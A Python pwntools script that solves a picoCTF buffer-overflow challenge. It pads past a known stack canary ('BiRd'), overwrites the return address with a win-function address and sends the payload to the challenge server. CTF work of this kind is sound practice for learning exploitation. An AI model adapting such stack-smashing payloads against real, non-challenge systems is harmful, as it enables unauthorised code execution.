from pwn import *

# details
HOST = "saturn.picoctf.net"
PORT = 61191

context.binary = './vuln'
context.arch = 'i386'
#context.log_level = 'debug'


win_func = 0x08049336
offset_to_canary = b"A"*64  # from the start of the payload
offset_to_eip = b"A"*16  # from the start of the **offset to the canary**
canary = b"BiRd"
payload = offset_to_canary + canary + offset_to_eip + p32(win_func)
buf_size = b"100"

r = remote(HOST, PORT)
with open("inp", "wb") as f:
    f.write(payload)

#r = process(["./vuln"])
r.sendlineafter(">", buf_size)  # sending the buffer size
r.sendlineafter(">", payload)  # sending the payload
r.interactive()
